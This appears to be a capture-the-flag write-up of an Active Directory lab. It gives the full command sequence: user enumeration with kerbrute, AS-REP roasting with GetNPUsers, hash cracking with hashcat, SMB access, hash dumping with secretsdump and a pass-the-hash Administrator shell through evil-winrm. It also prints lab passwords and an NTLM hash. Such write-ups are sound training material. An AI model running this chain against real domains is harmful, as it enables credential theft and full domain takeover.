# Attacktive Directory

## Enumeration

### nmap

Ran nmap and found a domain mentioned on the ldap port of spookysec.local. Updated this in the /etc/hosts file.

Also saw port 139/445 open.

### enum4linux

```bash
enum4linux -a spookysec.local
```

Found a domain for a workgroup on spookysec.local which was THM-AD.

### kerbrute

```bash
/home/kali/go/bin/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

Identified a list of valid users.

## Exploitation

### GetNPUsers.py

```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass
```

Took the output and placed it in a hash.txt file.

### Hashcat

```
hashcat -m 18200 hash.txt passwordlist.txt
```

Password was cracked from the hash.txt file

## Enumeration (Again)

Now that we have valid credentials we can check to see what other access we have.

### smbclient

```bash
smbclient -L //spookysec.local -U svc-admin --option='client min protocol=NT1'
# Then entered password of management2005 when prompted
smbclient //spookysec.local/backup -U svc-admin --option='client min protocol=NT1'
# backup@spookysec.local:backup2517860
```

## Privilege Escalation

### secretsdump.py

```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup@spookysec.local
```

We were able to dump users and their hashes including the Administrator. `aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc`

### evil-winrm.rb

```bash
evil-winrm -i 10.10.143.254 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

And we get a shell as the Administrator user.
